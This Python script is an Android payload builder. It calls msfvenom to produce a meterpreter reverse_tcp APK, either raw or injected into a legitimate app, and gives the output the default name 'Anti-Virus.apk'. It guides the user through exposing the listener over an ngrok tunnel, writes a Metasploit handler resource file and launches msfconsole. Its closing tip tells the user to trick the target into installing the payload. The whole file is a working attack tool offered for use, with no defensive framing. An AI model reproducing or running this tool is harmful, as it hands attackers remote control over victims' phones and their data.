#!/usr/bin/python3
#Author: Nathaniel Elderson


import os
import sys
import time
import subprocess


def createPayload(ip, port, path):
	command = "msfvenom -p android/meterpreter/reverse_tcp" + " LHOST=" + ip + " LPORT=" + str(port) + " -o " + path
	subprocess.call(command, shell=True)


def createEmbededPayload(appPath, ip, port, path):
	command1 = "msfvenom -x " + appPath + " -p android/meterpreter/reverse_tcp" + " LHOST=" + ip + " LPORT=" + str(port) + " -o " + path  
	subprocess.call(command1, shell=True)


def checkIP(ip):
	for letter in ip:
		if letter.isalpha() == True:
			return False
	if ip.count(".") != 3:
		return False
	if len(ip) < 7 or len(ip) > 15:
		return False
	if "." in ip[0]:
		return False
	return True


def animateWord(word):
	for char in word:
		sys.stdout.write(char)
		sys.stdout.flush()
		time.sleep(0.030)


def autoExploit(ip, port):
	meta = input("[\033[34m:?:\033[0m]\033[32mWant me to open the Metasploit Framework and exploit automatically for you(yes/N):\033[0m ").strip()
	if meta == "yes" or meta == "Yes" or meta == "YES" or meta == "y" or meta == "Y":
		os.system("clear")
		with open("commands.txt", "w") as file:
			file.write("use exploit/multi/handler\n")
			file.write("set payload android/meterpreter/reverse_tcp\n")
			file.write(f"set lhost {ip}\n")
			file.write(f"set lport " + str(port) + "\n")
			file.write("exploit")
	elif meta == "no" or meta == "No" or meta == "NO" or meta == "n" or meta == "N":
		print("[\033[93m :)\033[0m]\033[32mOK Bye!!!\033[0m")
		exit()
	else:
		print("[\033[31m:✗:\033[0m]\033[31mNot a valid option.\033[0m")
		exit()



WAN = False
wanORlan = input("[\033[34m:?:\033[0m]\033[32mWant to make payload for LAN or WAN(l/WAN):\033[0m ").strip()
if wanORlan == "wan" or wanORlan == "Wan" or wanORlan == "WAN" or wanORlan == "w" or wanORlan == "W":
	WAN = True
	print("\n\033[36mOpen up a new terminal and start a ngrok tcp tunnel with command \033[01m\033[32mngrok tcp 1234\033[0m")
	print("\033[36mGrab the IP and Port of the TCP tunnel and provide that IP and Port when prompted...\033[0m")
	print("\033[36mAfter this job press Enter to continue...\033[0m")
	input()
elif wanORlan == "lan" or wanORlan == "Lan" or wanORlan == "LAN" or wanORlan == "l" or wanORlan == "L":
	WAN = False
	print("[\033[34m:+:\033[0m]\033[32mProvide your local IP...\033[0m")
else:
	print("[\033[31m:✗:\033[0m]\033[31mNot a valid option...\033[0m")
	exit()


IP = input("[\033[34m:+:\033[0m]\033[32mEnter the IP Address:\033[0m ")
if IP == "":
	print("[\033[31m:✗:\033[0m]\033[31mNo IP provided.\033[0m")
	exit()
else:
	IPcheckPass = checkIP(IP)
	if IPcheckPass == True:
		pass
	else:
		print("[\033[31m:✗:\033[0m]\033[31mSeems like you need to learn about some basic networking...\033[0m")
		exit()


try:
	Port = input("[\033[34m:+:\033[0m]\033[32mEnter the Port Number to bind to:\033[0m ")
	if Port == "":
		print("[\033[31m:✗:\033[0m]\033[31mNo Port Number was provided.\033[0m")
		exit()
	for ch in Port:
		if ch.isalpha() == True:
			raise Exception
except Exception:
	print("[\033[31m:✗:\033[0m]\033[31mSeems like you need to learn about some basic networking...\033[0m")
	exit()


embeded = False
embed = input("[\033[34m:?:\033[0m]\033[32mWant an embeded payload(y) or just the raw payload(NO){y/NO}:\033[0m ").strip()
if embed == "yes" or embed == "Yes" or embed == "YES" or embed == "y" or embed == "Y":
	embeded = True
	filePath = input("[\033[34m:+:\033[0m]\033[32mEnter the path to original .apk file(\033[04m\033[01mprovide/the/full_path\033[0m\033[32m):\033[0m ").rstrip("/")
	check1 = os.path.exists(filePath)
	if check1 == True:
		if ".apk" not in filePath:
			print(f"[\033[31m:✗:\033[0m]\033[31m{filePath} is a directory but i asked for a .apk file...\033[0m")
			exit()
	if check1 == False:
		print("[\033[31m:✗:\033[0m]\033[31mPath does not exists.\033[0m")
		exit()
	payloadName = input("[\033[34m:+:\033[0m]\033[32mName the new embeded payload(\033[04m\033[01me.g. name.apk\033[0m\033[32m):\033[0m ")
	if payloadName == "":
		print("[\033[31m:✗:\033[0m]\033[31mNo name was provided.\033[0m")
		print("""[\033[34m:+:\033[0m]\033[32mSelecting default name "Anti-Virus.apk"\033[0m """)
		payloadName = "Anti-Virus.apk"
	if ".apk" not in payloadName:
		print("[\033[31m:✗:\033[0m]\033[31mmissing file extention '.apk'\033[0m")
		exit() 
	else:
		pass
	newName = False
	payloadPath = input("[\033[34m:+:\033[0m]\033[32mEnter the path to output the embeded payload\n(eg: \033[04m/please/provide/only_the/path/\033[0m\033[32m):\033[0m ").rstrip("/")
	check2 = os.path.exists(payloadPath)
	if payloadPath == "":
		newName = True
		out = os.getcwd()
		payloadPath = out
	elif check2 == False:
		print("[\033[31m:✗:\033[0m]\033[31mPath does not exists.\033[0m")
		exit()
	elif ".apk" in payloadPath:
		print("[\033[31m:✗:\033[0m]\033[31mIt was asked to provide only the path.\nStart the program again...\033[0m")
		exit()
	if newName == False:
		sentence2 = (f'\n\033[32mGenerating embeded payload having name "{payloadName}" with love only for you...\033[0m\n')
	else:
		newName == True
		print("[\033[31m:✗:\033[0m]\033[31mNo path was provided.\033[0m\n[\033[34m:+:\033[0m]\033[32mSelecting the present directory to output it.\033[0m")
		sentence2 = (f'\n\033[32mGenerating embeded payload "{payloadName}" at {payloadPath}\033[0m\n')
	animateWord(sentence2)
	print()
	createEmbededPayload(filePath, IP, Port, payloadPath + "/" + payloadName)
elif embed == "no" or embed == "No" or embed == "NO" or embed == "n" or embed == "N":
	embeded = False
	Path = input("[\033[34m:+:\033[0m]\033[32mEnter the full path to output the payload (\033[04m\033[01mor just 'name.apk'\033[0m\033[32m):\033[0m ").rstrip("/")
	if ".apk" in Path:
		pass
	else:
		check = os.path.exists(Path)
		if check == True:
			pass
		else:
			print("[\033[31m:✗:\033[0m]\033[31mPath does not exists.\033[0m")
			exit()
	namedPayload = False
	if ".apk" in Path:
		namedPayload = True
		for char in Path:
			if char == "/":
				namedPayload = False
		sentence3 = (f'\n\033[32mGenerating payload with love only for you...\033[0m\n')
		animateWord(sentence3)
		print()
		createPayload(IP, Port, Path)
		if namedPayload == True:
			print(f"[\033[34m:+:\033[0m]\033[32mPayload saved at {os.getcwd()}/{Path}\033[0m\n")
		else:
			namedPayload == False
			print(f"[\033[34m:+:\033[0m]\033[32mPayload saved at {Path}\033[0m\n")
	else:
		payloadYn = input("[\033[34m:+:\033[0m]\033[32mWant to rename the .apk file(yes/N):\033[0m ").strip()
		if payloadYn == "yes" or payloadYn == "Yes" or payloadYn == "YES" or payloadYn == "y" or payloadYn == "Y":
			name = input("[\033[34m:+:\033[0m]\033[32mEnter the name(\033[01m\033[04meg: name.apk\033[0m\033[32m):\033[0m ")
			sentence4 = (f'\n\033[32mGenerating payload having name "{name}" with love only for you...\033[0m\n')
			animateWord(sentence4)
			print()
			createPayload(IP, Port, Path + "/" + name)
			print(f"[\033[34m:+:\033[0m]\033[32mPayload saved at {Path}/{name}\033[0m\n")
		elif payloadYn == "no" or payloadYn == "No" or payloadYn == "NO" or payloadYn == "n" or payloadYn == "N":
			sentence5 = (f'\n\033[32mGenerating payload having name "payload.apk" with love only for you...\033[0m\n')
			animateWord(sentence5)
			print()
			createPayload(IP, Port, Path + "/payload.apk")
			print(f"[\033[34m:+:\033[0m]\033[32mPayload saved at {Path}/payload.apk\033[0m\n")
		else:
			print("[\033[31m:✗:\033[0m]\033[31mNot a valid option.\033[0m")
			exit()
else:
	print("[\033[31m:✗:\033[0m]\033[31mNot a valid option.\033[0m")
	exit()


print("\n\033[31mNOTE\033[0m: \033[04m\033[32mThis payload will be easily detected by the system's security.\033[0m")
print("\033[32mAnd it's upto you how you make the target install this payload on his/her Android OS.\033[0m")
print("\033[32mTIP from the author: Hack the most vulnerable OS the HumanOS to make it done.\033[0m\n")
print("\033[32mAfter this job press Enter to continue...\033[0m")
input()


if WAN == True:
	ip = "0.0.0.0"
	port = 1234
	autoExploit(ip, port)
	subprocess.call("msfconsole --resource commands.txt", shell=True)
elif WAN == False:
	autoExploit(IP, Port)
	subprocess.call("msfconsole --resource commands.txt", shell=True)



